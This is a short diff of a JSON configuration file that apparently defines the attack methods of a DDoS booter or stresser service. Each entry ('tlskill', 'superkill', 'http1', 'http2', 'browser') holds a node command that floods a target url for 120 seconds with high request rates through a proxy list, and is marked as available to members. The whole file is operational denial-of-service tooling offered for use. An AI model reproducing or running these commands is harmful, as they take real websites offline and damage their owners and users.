@@ -1,18 +1,12 @@
 {
-    "tlskill": {
-        "command": "node --max-old-space-size=65536 tlskill url 120 10 10 live.txt",
+    "http2": {
+        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 10 -r 999 -p live.txt --full true --delay 1 -d false ",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     },
-    "superkill": {
-        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 10 -r 999 -p live.txt -v 2 --full true --delay 1 -d false ",
-        "url": "url",
-        "time": 120,
-        "visibility": "MEMBER"
-    },
-    "browser": {
-        "command": "node --max-old-space-size=65536 browser url 120 10 10 live.txt",
+    "http1": {
+        "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 999 10 randomstring=true",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
